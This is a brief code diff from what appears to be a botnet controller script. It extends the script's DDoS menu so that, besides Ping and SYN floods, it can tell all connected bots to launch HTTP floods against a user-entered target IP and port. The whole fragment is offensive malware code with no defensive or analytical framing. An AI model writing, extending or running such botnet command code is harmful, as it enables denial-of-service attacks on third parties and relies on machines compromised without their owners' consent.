@@ -16,7 +16,7 @@ def commands():
 		if option == 1:
 			target_ip = input("Enter target IP address: ").encode()
 			target_port = input("Enter target port: ").encode()
-			ddos_type = input("Enter type of DDoS attack (Ping/SYN): ").encode()
+			ddos_type = input("Enter type of DDoS attack (Ping/SYN/HTTP): ").encode()
 			for bot in bots:
 				bot.send("DDoS_".encode() + target_ip + "_".encode() + target_port + "_".encode() + ddos_type)
 			print("Starting DDoS on target...")
